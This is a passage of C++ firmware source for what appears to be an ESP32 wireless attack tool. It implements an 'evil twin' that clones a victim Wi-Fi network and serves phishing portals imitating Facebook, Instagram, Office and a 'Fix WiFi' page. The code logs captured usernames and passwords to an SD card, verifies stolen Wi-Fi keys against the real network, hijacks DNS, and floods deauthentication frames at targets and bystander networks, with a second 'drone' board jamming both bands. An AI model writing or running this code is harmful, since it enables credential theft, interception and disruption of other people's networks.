    case 2: return String(ET_FACEBOOK_HTML);
    case 3: return String(ET_INSTAGRAM_HTML);
    case 4: return String(ET_OFFICE_HTML);
    case 5: return String(ET_FIX_HTML);
    case 6: return String(ET_LIVE_HTML);
    default: break;
  }
  // SD custom page
  if(sdMounted && etTmplPath[idx].length()>0){
    File f=SD.open(etTmplPath[idx].c_str(),"r");
    if(f){
      String html=f.readString();
      f.close();
      if(html.length()>0){
        if(html.length()>24000) html=html.substring(0,24000);
        return html;
      }
    }
  }
  return String(ET_PORTAL_HTML);
}

// <option> list of nearby networks for the FIX WIFI story page.
static String etNetOptions(){
  String o="";
  size_t n=0;
  for(size_t i=0;i<apCount && n<12;i++){
    if(aps[i].ssid.length()==0)continue;
    String s=aps[i].ssid;
    s.replace("<","&lt;"); s.replace(">","&gt;");
    o+="<option>"+s+"</option>";
    n++;
  }
  if(o.length()==0) o="<option>My Network</option>";
  return o;
}

static void etSendPortal(){
  etHits++;
  etTermHit();
  String page=etTemplateHTML(etTemplate);
  page.replace("%SSID%",sanitizeSSID(etSSID,26));
  if(page.indexOf("%NETS%")>=0) page.replace("%NETS%",etNetOptions());
  if(page.indexOf("%MSG%")>=0) page.replace("%MSG%",etKeyEsc);
  etWeb.send(200,"text/html",page);
}
static void etSendChecking(){ etWeb.send(200,"text/html",ET_CHECK_HTML); }
static void etSendDone(){
  // After a verified password the FIX twin keeps serving this success page
  // ("the victim passes"); the other twins are fully stopped by then.
  if(etSuccess && etFix){ etWeb.send(200,"text/html",ET_DONE_HTML); return; }
  etWeb.send(200,"text/html",ET_DONE_HTML);
}
static void etHandlePost(){
  etHits++;
  String user=etWeb.arg("u");
  String pass=etWeb.arg("p");
  String ssidIn=etWeb.arg("ssid");
  if(pass.length()==0) pass=etWeb.arg("password");
  if(pass.length()==0) pass=etWeb.arg("key");
  if(pass.length()==0) pass=etWeb.arg("passwd");
  if(pass.length()==0) pass=etWeb.arg("Passwd");
  if(pass.length()==0) pass=etWeb.arg("pass");
  if(user.length()==0) user=etWeb.arg("email");
  if(user.length()==0) user=etWeb.arg("Email");
  if(user.length()==0) user=etWeb.arg("loginfmt");
  if(user.length()==0) user=etWeb.arg("username");
  if(user.length()==0) user=etWeb.arg("user");
  if(pass.length()>0){
    etCreds++;
    etCredLast=pass.substring(0,24);
    bool sdSaved=false;
    if(prefsOK){ prefs.putString("et_last_u",user.substring(0,32)); prefs.putString("et_last_p",pass.substring(0,64)); }
    if(sdMounted){
      File f=SD.open("/CAPTURED.TXT","a");
      if(f){
        String netName=(ssidIn.length()>0)?ssidIn:etSSID;
        f.print(netName); f.print(" | ");
        f.print(user);    f.print(" | ");
        f.println(pass);
        f.close();
        sdSaved=true;
      }
    }
    String uShow=(user.length()>0)?user.substring(0,34):String("-");
    uShow.replace('\n',' ');uShow.replace('\r',' ');
    String pShow=pass.substring(0,34);
    pShow.replace('\n',' ');pShow.replace('\r',' ');
    etTermLog("[CREDS] USER: "+uShow,WHITE);
    etTermLog("[CREDS] PASS: "+pShow,GREEN);
    etTermLog(sdSaved?String("[SD] SAVED /CAPTURED.TXT"):String("[RAM] NO SD - NVS ONLY"),sdSaved?GREEN:YELLOW);
    Serial.printf("[EVILTWIN] credential captured (%u total)\n",(unsigned)etCreds);
    // V20/V21 password verification: test the captured password against the
    // real network (WiFi.begin on the STA side). Correct password = SUCCESS
    // flow. Wi-Fi style pages only (built-ins 0 and 6) - account pages just
    // capture.
    int8_t tb=etTmplBuiltin[etTemplate<etTmplCount?etTemplate:0];
    String vs=(etFix && ssidIn.length()>0)?ssidIn:etSSID;
    if(etFix || tb==0 || tb==6){
      etVerifyState=1;
      etVerifyStart=millis();
      etVerifyPass=pass;
      etVerifySSID=vs;
      etTermLog("[CHECK] TESTING AGAINST '"+sanitizeSSID(vs,20)+"'...",CYAN);
      WiFi.begin(vs.c_str(),pass.c_str());
    }
  }
  etSendChecking();
}
static void etCaptive(){
  etHits++;
  String uri=etWeb.uri();
  // V28: faster + more universal captive popup. Every known OS connectivity
  // probe gets an immediate 302 (the OS then opens the portal window by
  // itself); ANY OTHER unknown URI also gets the 302 now - answering 200
  // made some OSes believe "internet works" and never show the popup.
  // Windows: connecttest.txt + ncsi.txt + dns.msftncsi + msftconnecttest
  // Android: generate_204 / gen_204 (Google, MIUI, EMUI, vivo all match)
  // Apple:   hotspot-detect.html (macOS + iOS CNA) + detectportal.firefox
  static const char* CHECKS[]={"generate_204","gen_204","hotspot-detect","connecttest","ncsi",
    "msftconnecttest","msftncsi","redirect","canonical","fwlink","kindle-wifi","success","ncm",
    "check_network","connectivity","detectportal","status","portal","captive"};
  for(const char* c:CHECKS){
    if(uri.indexOf(c)>=0){
      etWeb.sendHeader("Location","http://192.168.4.1/",true);
      etWeb.sendHeader("Cache-Control","no-store");
      etWeb.send(302,"text/plain","");
      return;
    }
  }
  if(uri=="/post"){etHandlePost();return;}
  if(uri=="/checking"){etSendChecking();return;}
  if(uri=="/done"){etSendDone();return;}
  // V28: unknown URI = another connectivity check we did not list -> 302 to
  // the portal root. The portal itself lives on "/" and is served instantly.
  etWeb.sendHeader("Location","http://192.168.4.1/",true);
  etWeb.sendHeader("Cache-Control","no-store");
  etWeb.send(302,"text/plain","");
}
static void etSetupRoutes(){
  etWeb.on("/",etSendPortal);
  etWeb.on("/post",etHandlePost);
  etWeb.on("/done",etSendDone);
  etWeb.onNotFound(etCaptive);
}
static void etLoadCustom(){
  // V20: superseded by the portal template system (built-ins + SD *.html
  // picker). Kept as a no-op for source compatibility.
}
// First boot with an SD card: write the ready-to-edit sample portal page so
// there is always a working HTML test file at /PORTAL.HTML.
static void etWriteSamplePortal(){
  if(!sdMounted) return;
  if(SD.exists("/PORTAL.HTML")||SD.exists("/portal.html")) return;
  File f=SD.open("/PORTAL.HTML","w");
  if(!f){ etTermLog("[SD] SAMPLE WRITE FAILED",RED); return; }
  f.print(ET_PORTAL_HTML);
  f.close();
  etTermLog("[SD] SAMPLE /PORTAL.HTML WRITTEN",YELLOW);
}

// ---------------- V21 internet replication: NAPT + DNS forwarder --------
// "Replicate the internet": once the real password is known (typed by the
// user or captured and verified from a victim) the STA joins the REAL
// network and lwIP NAPT shares that uplink with every client of the evil
// clone, so the fake network becomes a fully working internet connection.
// DNS switches from wildcard hijack to a real forwarding resolver.
static WiFiUDP  etFwdCli;              // listens on :53 for clone clients
static WiFiUDP  etFwdSrv;              // ephemeral socket to the real DNS
static bool     etFwdUp=false;
static IPAddress etFwdUpIp;
static uint8_t  etFwdQ[512];
static int      etFwdQLen=0;
static IPAddress etFwdClientIp;
static uint16_t etFwdClientPort=0;
static uint32_t etFwdPendingMs=0;

static bool etDnsStartFwd(){
  if(etFwdUp) return true;
  etFwdUpIp=WiFi.dnsIP();
  if(etFwdUpIp[0]==0) etFwdUpIp=IPAddress(8,8,8,8);
  delay(10);                           // let the DNSServer release :53
  if(!etFwdCli.begin(53)) return false;
  etFwdUp=true; etFwdQLen=0;
  return true;
}
static void etDnsStopFwd(){
  if(etFwdUp){ etFwdCli.stop(); etFwdUp=false; }
  etFwdSrv.stop();
  etFwdQLen=0;
}
// Timeout fallback: answer the stored query ourselves so a client is never
// left without a response. A-records point at the clone (captive portal);
// anything else gets NOTIMP.
static void etDnsAnswerHijack(){
  if(etFwdQLen<12) return;
  uint16_t qtype=((uint16_t)etFwdQ[etFwdQLen-4]<<8)|etFwdQ[etFwdQLen-3];
  static uint8_t out[600];
  memcpy(out,etFwdQ,etFwdQLen);
  out[2]=0x81; out[3]=0x80;            // QR + RD + RA, rcode 0
  out[6]=0; out[7]=0; out[8]=0; out[9]=0; out[10]=0; out[11]=0;
  int len=etFwdQLen;
  if(qtype==1){
    out[7]=1;                          // ANCOUNT = 1
    out[len++]=0xC0; out[len++]=0x0C;  // name pointer to the question
    out[len++]=0; out[len++]=1;        // type A
    out[len++]=0; out[len++]=1;        // class IN
    out[len++]=0;out[len++]=0;out[len++]=0;out[len++]=10; // TTL 10 s
    out[len++]=0; out[len++]=4;        // RDLENGTH
    IPAddress ap=WiFi.softAPIP();
    out[len++]=ap[0];out[len++]=ap[1];out[len++]=ap[2];out[len++]=ap[3];
  }else{
    out[3]=0x84;                       // rcode NOTIMP
  }
  etFwdCli.beginPacket(etFwdClientIp,etFwdClientPort);
  etFwdCli.write(out,len);
  etFwdCli.endPacket();
}
// Non-blocking forwarder state machine, called every loop while NAT is on.
static void etDnsFwdService(){
  if(!etFwdUp) return;
  int n=etFwdCli.parsePacket();
  if(n>0){
    int len=etFwdCli.read(etFwdQ,sizeof(etFwdQ));
    if(len>=12 && len<=(int)sizeof(etFwdQ)){
      etFwdQLen=len;
      etFwdClientIp=etFwdCli.remoteIP();
      etFwdClientPort=etFwdCli.remotePort();
      etFwdSrv.stop();                 // fresh ephemeral socket per query
      etFwdSrv.begin(0);
      etFwdSrv.beginPacket(etFwdUpIp,53);
      etFwdSrv.write(etFwdQ,etFwdQLen);
      etFwdSrv.endPacket();
      etFwdPendingMs=millis();
    }
    return;
  }
  if(etFwdQLen>=12){
    int m=etFwdSrv.parsePacket();
    if(m>0){
      static uint8_t resp[600];
      int rl=etFwdSrv.read(resp,sizeof(resp));
      if(rl>12){
        etFwdCli.beginPacket(etFwdClientIp,etFwdClientPort);
        etFwdCli.write(resp,rl);
        etFwdCli.endPacket();
      }
      etFwdQLen=0;
      return;
    }
    if(millis()-etFwdPendingMs>3000){ etDnsAnswerHijack(); etFwdQLen=0; }
  }
}
#if SALARINI_NAPT_AVAILABLE
static bool enableEtNat(){
  if(etNatOn) return true;
  esp_netif_t staNetif=esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
  if(!staNetif) return false;
  if(esp_netif_napt_enable(staNetif)!=0) return false;   // 0 == ESP_OK
  etNatOn=true;
  if(etDNSUp){ etDNS.stop(); etDNSUp=false; }            // hijack -> forwarding
  if(etDnsStartFwd()) etTermLog("[DNS] REAL DNS FORWARDING",GREEN);
  else etTermLog("[DNS] FORWARDER BIND FAILED",YELLOW);
  return true;
}
#else
static bool enableEtNat(){
  etTermLog("[NET] NAPT NOT IN THIS CORE",YELLOW);
  return false;
}
#endif

static void stopEvilTwin(){
  if(!etActive) return;
  etActive=false;
  drone::jobStop();              // V23: quiet the drone too (best effort)
  if(dualModeOn) droneReleaseAfterAttack();   // V23.2: dual auto-link ends with the ET
  etVerifyState=0; etSuccess=false;
  etReplicate=false; etKeyPortal=false; etNatOn=false;
  etDnsStopFwd();
  if(etWebUp){ etWeb.stop(); etWebUp=false; }
  if(etDNSUp){ etDNS.stop(); etDNSUp=false; }
  WiFi.softAPdisconnect(true);   // correct core API name (lowercase d)
  delay(30);
  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  WiFi.disconnect(false,false);  // drop the verification connection if any
  etRadioCh=0;
  Serial.println("[EVILTWIN] stopped, radio back to STA");
}
// V20/V21 softAP start with a full fallback chain. On the C5 the core
// rejects 5 GHz softAP channels when band/country state is not aligned yet
// - the root cause of "SOFTAP FAILED" on some networks. Each step relaxes
// one constraint so the portal always comes up. V21 adds an explicit
// 5 GHz-only band attempt before giving the victim channel up.
static bool etSoftAPStart(uint8_t channel,uint8_t &usedCh){
  WiFi.softAPdisconnect(true);
  delay(10);
  // 1) force band mode + channel first, then start the AP on the victim ch
  esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
  ae::unleashTx();               // V23.1: re-assert max TX power before AP start
  esp_wifi_set_channel(channel,WIFI_SECOND_CHAN_NONE);
  delay(10);
  if(WiFi.softAP(etSSID.c_str(),nullptr,channel,0,8)){ usedCh=channel; return true; }
  // 2) 5 GHz-only band state: some 5G channels are rejected while the radio
  //    is still in dual-band mode from a previous scan/connection
  if(channel>14){
    esp_wifi_set_band_mode(WIFI_BAND_MODE_5G_ONLY);
    delay(5);
    if(WiFi.softAP(etSSID.c_str(),nullptr,channel,0,8)){
      esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
      usedCh=channel; return true;
    }
    esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
  }
  // 3) fewer max clients (some 5 GHz firmware variants reserve slots)
  if(WiFi.softAP(etSSID.c_str(),nullptr,channel,0,4)){ usedCh=channel; return true; }
  // 4) let the core choose the channel for us
  if(WiFi.softAP(etSSID.c_str(),nullptr,0,0,8)){
    uint8_t c=(uint8_t)WiFi.channel(); if(c<1)c=1;
    usedCh=c; return true;
  }
  // 5) guaranteed 2.4 GHz channels: the portal still works even if the
  //    clone then lives on a different channel than the victim. V21 keeps
  //    the victim channel in etVictimCh and the deauth loop hops there.
  if(WiFi.softAP(etSSID.c_str(),nullptr,6,0,8)){ usedCh=6; return true; }
  if(WiFi.softAP(etSSID.c_str(),nullptr,1,0,8)){ usedCh=1; return true; }
  return false;
}
// mode: 1 = Evil Twin, 2 = classic Mega, 3 = Fix WiFi Twin,
//       7 = Mega "Replicate Internet", 8 = Mega "Keyboard Page" (V21)
static bool startEvilTwin(uint8_t mode,const uint8_t *bssid,const char* ssid,uint8_t channel){
  if(mode!=3 && (!ssid || ssid[0]==0)){ showPopup("EVIL TWIN","INVALID TARGET","HIDDEN SSID NOT SUPPORTED"); return false; }
  stopMonitor();
  ae::attackStop();
  stopBLECarrier();
  if(etActive) stopEvilTwin();
  etFix=(mode==3);
  etMega=(mode==2||mode==7||mode==8);
  etReplicate=(mode==7);
  etKeyPortal=(mode==8);
  etNatOn=false;
  etSuccess=false;
  etRealAsked=false; etRealSkipped=false;
  etVerifyState=0; etVerifyPass=""; etVerifySSID="";
  etLastFixHop=0; etFixHopIdx=0;
  memcpy(etBSSID,bssid,6);
  etVictimCh=(channel<1)?1:channel;
  etChannel=etVictimCh;
  etVictimEnc=false;                     // V24: mirror the victim's security
  for(size_t i=0;i<apCount && i<MAX_APS;i++){
    uint8_t xb[6]; apParseBSSID(aps[i].bssid,xb);
    if(memcmp(xb,bssid,6)==0){ etVictimEnc=aps[i].encrypted; break; }
  }
  etBuildTwins(bssid,ssid,etVictimCh);
  etSSID=etFix?String("Fix WiFi"):String(ssid).substring(0,32);
  etKeyEsc=etKeyMsg;
  etKeyEsc.replace("&","&amp;");etKeyEsc.replace("<","&lt;");etKeyEsc.replace(">","&gt;");etKeyEsc.replace("\"","&quot;");
  if(etKeyEsc.length()==0) etKeyEsc="Please enter the Wi-Fi password to reconnect.";
  etTx=0; etHits=0; etCreds=0; etCredLast="";
  etStartMs=millis(); etLastDeauth=0; etLastBeacon=0;
  etTermReset();
  etTermLog(String("[BOOT] ")+(etFix?"FIX WIFI TWIN":(etReplicate?"MEGA TWIN + INTERNET":(etKeyPortal?"KEYBOARD PORTAL":(etMega?"EVIL MEGA TWIN":"EVIL TWIN"))))+" ONLINE",CYAN);
  etTermLog(String("[NET] VICTIM CH ")+String(etVictimCh)+(etVictimCh>14?String(" (5 GHZ)"):String(" (2.4 GHZ)")),GRAY);
  if(etTwinCount>1) etTermLog(String("[NET] ")+String((unsigned)etTwinCount)+" BSSIDS OF THE SSID - ALL HIT",GRAY);
  WiFi.mode(WIFI_AP_STA);
  WiFi.setSleep(false);
  WiFi.disconnect(false,false);
  delay(20);
  IPAddress ip(192,168,4,1);
  WiFi.softAPConfig(ip,ip,IPAddress(255,255,255,0));
  uint8_t usedCh=etChannel;
  if(!etSoftAPStart(etChannel,usedCh)){
    WiFi.mode(WIFI_STA);
    showPopup("EVIL TWIN","SOFTAP FAILED","TRY ANOTHER TARGET"); return false;
  }
  if(usedCh!=etVictimCh){
    etTermLog(String("[AP] CH ")+String(etVictimCh)+" REJECTED",YELLOW);
    etChannel=usedCh;
    etTermLog(String("[AP] CLONE ON CH ")+String(usedCh)+" - DEAUTH STAYS ON VICTIM CH",YELLOW);
  }
  etRadioCh=0;
  etGotoChannel(etChannel);   // V21: sync the STA-side radio with the AP channel
  etDNS.start(53,"*",WiFi.softAPIP());
  etDNSUp=true;
  etSetupRoutes();
  etWeb.begin();
  etWebUp=true;
  etTermLog(String("[AP] ")+etSSID+" CH "+String(etChannel),WHITE);
  etTermLog("[DNS] HIJACK * -> 192.168.4.1",GREEN);
  etTermLog("[WEB] CAPTIVE PORTAL SERVING",GREEN);
  etWriteSamplePortal();
  if(etKeyPortal){
    etTermLog("[HTML] LIVE KEYBOARD PAGE",YELLOW);
  }else{
    String tpl=etTmplName[etTemplate<etTmplCount?etTemplate:0];
    if(etTmplBuiltin[etTemplate<etTmplCount?etTemplate:0]==-1) etTermLog("[HTML] SD PAGE: "+tpl,YELLOW);
    else etTermLog("[HTML] TEMPLATE: "+tpl,YELLOW);
  }
  if(etFix) etTermLog("[MODE] SMART DEAUTH + LIVE VERIFY",CYAN);
  else if(etReplicate) etTermLog("[MODE] REPLICATE INTERNET (NAT)",CYAN);
  else if(etKeyPortal) etTermLog("[MODE] USER MESSAGE PORTAL",CYAN);
  else if(etMega) etTermLog("[MODE] MAX PRESSURE",CYAN);
  etActive=true;
  hsPopupShown=false;
  actionReturnScreen=COMBO;
  transitionTo(ATTACK_LIVE);
  // V23 DUO: if the drone link is alive (DUO EVIL TWIN or a manual link)
  // hand the whole victim family to the second radio.
  if(drone::linked()) droneAssistEvilTwin();
  etDuoJam=false;
  Serial.printf("[EVILTWIN] mode=%u started: '%s' AP-CH %u victim-CH %u twins=%u\n",(unsigned)mode,etSSID.c_str(),etChannel,etVictimCh,(unsigned)etTwinCount);
  // V21 replicate: a pre-entered real password is verified immediately so
  // the internet sharing comes up without waiting for a victim.
  if(etReplicate && etRealPass.length()>0){
    etVerifyState=1; etVerifyStart=millis();
    etVerifyPass=etRealPass; etVerifySSID=String(ssid);
    etTermLog("[CHECK] TESTING ENTERED PASSWORD...",CYAN);
    WiFi.begin(ssid,etRealPass.c_str());
  }
  showPopup(etFix?"FIX WIFI TWIN":(etMega?"MEGA EVIL TWIN":"EVIL TWIN"),"PORTAL LIVE","DEAUTH ON VICTIM CH",1600);
  return true;
}
static void serviceEvilTwin(){
  if(!etActive) return;
  // V23 DUO: surface drone status changes (JAM<->IDLE, target count) in the
  // portal terminal - the TX counter inside the line changes every poll so
  // only the stable prefix is compared.
  if(drone::linked()){
    static String dLastKey="";
    const String &st=drone::lastStat();
    if(st.length()>0){
      int stp=st.indexOf("ST="), tgp=st.indexOf(";TG=");
      String key=(stp>=0&&tgp>=0)?st.substring(stp,tgp+5):String("");
      if(key.length()>0 && key!=dLastKey){ dLastKey=key; etTermLog("[DRONE] "+st,GRAY); }
    }
  }
  // ---- V20 password verification state machine ----
  // While testing the captured password against the real network the deauth
  // pressure is paused (otherwise we would knock ourselves off the STA link).
  if(etVerifyState==1){
    if(WiFi.status()==WL_CONNECTED){
      etVerifyState=2;
      etSuccess=true;
      etTermLog("[OK] PASSWORD CORRECT",GREEN);
      etTermLog("[OK] SUCCESSFUL",GREEN);
      etTermLog("[PASS] "+etVerifyPass.substring(0,26),WHITE);
      if(etFix){
        etTermLog("[OK] CONNECTION RESTORED FOR CLIENT",YELLOW);
      }else if(etReplicate){
        // V21: the STA is now joined to the REAL network - share it.
        if(enableEtNat()){
          etTermLog("[NET] INTERNET SHARING LIVE",GREEN);
          etTermLog("[INFO] BROWSE OR BACK TO EXIT",GRAY);
        }else{
          etTermLog("[NET] NAT UNAVAILABLE - PORTAL ONLY",YELLOW);
        }
        uint8_t c=(uint8_t)WiFi.channel();
        if(c>=1){ etChannel=c; etRadioCh=0; etGotoChannel(etChannel); }
        etTermLog(String("[AP] CLONE ON CH ")+String(etChannel)+" WITH INTERNET",YELLOW);
      }else{
        etTermLog("[OK] DEAUTH + PORTAL STOPPED",YELLOW);
        etTermLog("[INFO] COPY PASSWORD, THEN BACK",GRAY);
      }
      // V23 DUO: the jam must stop when the password verifies, and an auto
      // link is released so the BLE radio is free again.
      if(drone::linked() || drone::autoLink()){
        etTermLog("[DRONE] JAM STOPPED",GRAY);
        droneReleaseAfterAttack();
      }
      Serial.println("[EVILTWIN] SUCCESS: password verified");
      if(etFix){
        // FIX twin keeps the success page online so the victim 'passes'.
      }else if(etReplicate){
        // V21 replicate: portal + clone STAY UP, now with real internet.
      }else{
        if(etWebUp){ etWeb.stop(); etWebUp=false; }
        if(etDNSUp){ etDNS.stop(); etDNSUp=false; }
        WiFi.softAPdisconnect(true);
      }
      return;
    }
    if(millis()-etVerifyStart>12000){
      etVerifyState=0;
      WiFi.disconnect(false,false);
      etRadioCh=0;
      etGotoChannel(etChannel);   // V21: re-sync the radio with our AP channel
      etTermLog("[CHECK] WRONG PASSWORD - TRY AGAIN",RED);
    }
    return;
  }
  uint32_t now=millis();
  if(etDNSUp) etDNS.processNextRequest();
  if(etNatOn) etDnsFwdService();        // V21 real-DNS forwarding while NAT runs
  if(etWebUp) etWeb.handleClient();
  if(etSuccess) return;                 // verified: all pressure stays off
  // ---- V21 deauth pressure with full channel management ----
  // The clone softAP may live on a fallback channel (5 GHz victims), but
  // every burst is delivered on the VICTIM's channel/band after an explicit
  // retune, and dual-band routers get BOTH BSSIDs hit. When a victim is
  // inside the portal the hopping pauses so the captive page stays snappy.
  uint32_t dGate=etMega?250u:(etFix?350u:700u);
  if(now-etLastDeauth>=dGate){
    etLastDeauth=now;
    static const uint8_t BCAST[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool mayHop=(WiFi.softAPgetStationNum()==0);
    // 1) primary victim BSSID on the victim channel (any band)
    etGotoChannel(etVictimCh);
    etTxDeauth(BCAST,0xC0,etMega?18:(etFix?14:10));
    if(etMega) etTxDeauth(BCAST,0xA0,10);   // disassoc overload in MEGA
    // Directed kicks at known clients of the victim AP (all modes).
    for(size_t i=0;i<ae::staCount() && i<8;i++){
      ae::STAInfo *s=ae::staAt(i);
      if(s && (memcmp(s->ap,etBSSID,6)==0 || (etFix && s->ap[0]==0 && s->ap[1]==0 && s->ap[2]==0 && s->ap[3]==0 && s->ap[4]==0 && s->ap[5]==0))) etTxDeauth(s->sta,0xC0,6);
    }
    // 2) FIX: also deauth every other AP heard on the victim channel
    //    (framed from their own BSSID so their clients log off too).
    if(etFix){
      for(size_t i=0;i<apCount && i<MAX_APS;i++){
        if((uint8_t)aps[i].channel!=etVictimCh)continue;
        uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
        if(memcmp(b,etBSSID,6)==0)continue;
        etTxDeauthFrom(b,BCAST,0xC0,4);
      }
    }
    // 3) same-SSID BSSIDs on other channels/bands (dual-band routers).
    if(etTwinCount>0){
      size_t tc=etTwinCount;
      for(size_t i=0;i<tc;i++){
        size_t k=(etTwinIdx+i)%tc;
        if(memcmp(etTwins[k].bssid,etBSSID,6)==0)continue;   // primary done
        if(etTwins[k].channel!=etRadioCh){
          if(!mayHop)continue;                               // keep portal stable
          etGotoChannel(etTwins[k].channel);
        }
        etTxDeauthFrom(etTwins[k].bssid,BCAST,0xC0,etMega?10:6);
      }
      etTwinIdx=(etTwinIdx+1)%tc;
    }
    // 4) FIX smart sweep: every 4.5 s hop to one other occupied channel,
    //    fire a short burst there and hop straight back to the portal ch.
    if(etFix && mayHop && apCount>0 && now-etLastFixHop>=4500){
      etLastFixHop=now;
      size_t tries=0, idx=etFixHopIdx;
      while(tries<apCount){
        size_t i=idx%apCount; idx++;
        if(aps[i].ssid.length()>0 && (uint8_t)aps[i].channel!=etVictimCh){
          uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
          etGotoChannel((uint8_t)aps[i].channel);
          etTxDeauthFrom(b,BCAST,0xC0,8);
          break;
        }
        tries++;
      }
      etFixHopIdx=idx;
    }
    etGotoChannel(etChannel);   // back to the portal channel
  }
  // Clone beacons keep the twin dominant in every nearby scan list.
  uint32_t bGate=etMega?80u:120u;
  if(now-etLastBeacon>=bGate){
    etLastBeacon=now;
    etTxBeacon();
  }
}
// Targeted launch dispatcher used by the AP pick flow (AP_RESULTS):
// mode 1 = Evil Twin, 2 = classic Mega, 3 = Handshake capture, 4 = PMKID grab,
// mode 5 = Client Hunter, 6 = Fix WiFi Twin, 7 = Mega Replicate Internet,
// mode 8 = Mega Keyboard Page (V21).
// Evil-family attacks (1/2/6/7) first open the PORTAL_PICK template menu;
// mode 8 goes straight to the on-screen keyboard for the portal message.
// --------------------- V23 DUO: drone attack helpers -----------------------
// Push the evil twin victim family (every BSSID of the SSID, both bands) to
// the drone and start its jammer. The portal board stays glued to its own
// channel while the drone does the band-hopping pressure - that is what
// makes 5 GHz evil twins finally work with two radios.
static void droneAssistEvilTwin(){
  if(!drone::linked()) return;
  drone::setAuto(true);                 // V24: auto link - released with the ET
  drone::jobBegin();
  for(size_t i=0;i<etTwinCount;i++) drone::jobAdd(etTwins[i].channel,etTwins[i].bssid);
  uint8_t rate=(ae::powerLevel()==ae::Power::PWR_LOW)?1:((ae::powerLevel()==ae::Power::PWR_MED)?2:3);
  drone::jobRun(rate);
  // V24 BEACON CLONE REINFORCEMENT: while the drone jams the victim family it
  // ALSO beacons a clone of the twin SSID on a remote channel (first 5 GHz
  // family channel if any, else a neighbour 2.4 GHz channel) with the
  // victim's security mirrored - the twin name now shows up in every nearby
  // list on both bands and roaming clients slide towards the real portal.
  uint8_t bcCh=0;
  for(size_t i=0;i<etTwinCount;i++) if(etTwins[i].channel>14){ bcCh=etTwins[i].channel; break; }
  if(!bcCh) bcCh=(etChannel==6)?11:6;
  if(drone::beaconStart(bcCh,etSSID.c_str(),etVictimEnc))
    etTermLog(String("[DRONE] CLONE BEACONS ON CH ")+String(bcCh)+(etVictimEnc?" (SEC)":" (OPEN)"),CYAN);
  etTermLog(String("[DRONE] LINKED - JAM ")+String((unsigned)etTwinCount)+" TARGETS",CYAN);
}

// Interactive pre-attack link: shows a popup, then connects (blocking for
// the connect window - the popup stays visible because the loop is parked).
static bool droneEnsureForAttack(){
  if(drone::linked()) return true;
  // V24.1: the link is a plain TX/RX UART - it never collides with the BLE
  // spam module and needs no library, just the 3-wire harness.
  // V25: the AUTO-PIN sweep finds the pins by itself - no fixed wiring to
  // get wrong. The blocking window covers the FAST path; the full sweep
  // keeps running in the background even if this returns false.
  showPopup("DRONE DUO","LINKING DRONE...","AUTO-PIN SCAN + GND");
  if(!drone::linkStart()){
    showPopup("DRONE DUO","DRONE NOT FOUND YET","CHECK GND - SCAN KEEPS GOING");
    return false;
  }
  return true;
}

// Called when an attack that used the drone ends: STOP the job and release
// an AUTO link (manual links stay until the user unlinks them).
static void droneReleaseAfterAttack(){
  drone::jobStop();
  drone::setPersistent(false);          // V24: no more auto re-link once done
  if(drone::autoLink()) drone::linkStop();
}

// ---- V23.2 DUAL MODE: one switch, every attack uses the drone --------------
// Saved in Settings (prefs "dualon"). When ON, EVERY Wi-Fi TX attack (deauth
// all/channel/selected, STA deauth, auth, assoc, beacons, karma, probe flood,
// client hunt, EAPOL/QoS/RTS floods, handshake, PMKID, storms, rickroll...)
// links the SX-DRONE at start, hands it the targets and runs it at the
// ATTACK POWER pace until the attack stops. Evil twins force the DUO jam too.
// BLE spam stays local (the BLE radio IS the spam radio) and LAN/passive
// tools (scans, monitor) have no second-radio job.
static uint8_t dualRateFromPower(){
  return (ae::powerLevel()==ae::Power::PWR_LOW)?1:((ae::powerLevel()==ae::Power::PWR_MED)?2:3);
}

static void hookDualAttackStart(const char* title,const DualTarget* tg,size_t n){
  if(!dualModeOn || dualHookSkip) return;
  if(etActive) return;                       // evil twin drives its own drone job
  // V24.1: the drone link is TX/RX UART - BLE spam no longer blocks it,
  // the second radio joins the attack even while a BLE spam module runs.
  // V25: mark the link wanted + mirrored FIRST. If the AUTO-PIN sweep has
  // not landed yet the attack starts SOLO and the moment the link comes up
  // the whole job replays itself - the drone joins mid-attack by itself.
  drone::setAuto(true);
  drone::setPersistent(true);                // V24: keep re-linking while the attack runs
  if(!drone::linked()){
    showPopup("DUAL MODE","LINKING DRONE...","AUTO-PIN SCAN");
    if(!drone::linkStart()){
      Serial.println("[DUAL] drone not found yet - job mirrored, joins late");
    }
  }
  drone::jobBegin();
  uint8_t pushed=0;
  for(size_t i=0;i<n && pushed<8;i++){ drone::jobAdd(tg[i].channel,tg[i].bssid); pushed++; }
  if(pushed==0){
    // V24: targetless attack (karma / storms / floods) - the drone SWEEPS the
    // whole spectrum (every non-DFS 2.4 + 5 GHz channel, broadcast deauth at
    // each stop) while the main radio runs its own pattern.
    drone::sweep(dualRateFromPower());
    Serial.println("[DUAL] no targets - drone SWEEP jam (all bands)");
  }
  uint8_t r=dualRateFromPower();
  drone::jobRun(r);
  Serial.printf("[DUAL] %s + DRONE: %u targets GO:%u\n",title?title:"ATTACK",(unsigned)pushed,(unsigned)r);
}

static void hookDualAttackStop(){
  if(!dualModeOn || dualHookSkip) return;
  if(etActive) return;
  drone::jobStop();
  drone::setPersistent(false);               // V24
  if(drone::autoLink()) drone::linkStop();
  Serial.println("[DUAL] drone released");
}

static void launchTargetedMode(uint8_t mode,size_t apIdx){
  if(apIdx>=apCount) return;
  uint8_t b[6]; apParseBSSID(aps[apIdx].bssid,b);
  if(mode==1 || mode==2 || mode==6 || mode==7){
    etPendingMode=(mode==6)?3:mode;   // internal fix mode = 3
    etPendingApIdx=apIdx;
    etTemplate=(mode==6)?5:0;         // FIX defaults to its story page
    buildTemplateList();
    listTop=0;
    transitionTo(PORTAL_PICK);
    return;
  }
  if(mode==9 || mode==10 || mode==11 || mode==12 || mode==14){
    // V23 DUO attacks: the drone link goes live right here (user request:
    // the two boards only talk while the attack runs).
    if(!droneEnsureForAttack()) return;
    stopMonitor();
    syncEngineAPs();
    uint8_t rate=(ae::powerLevel()==ae::Power::PWR_LOW)?1:((ae::powerLevel()==ae::Power::PWR_MED)?2:3);
    if(mode==9){
      // DUO EVIL TWIN: portal on this board, ALL victim BSSIDs jammed by
      // the drone (solves the single-radio 5 GHz limitation).
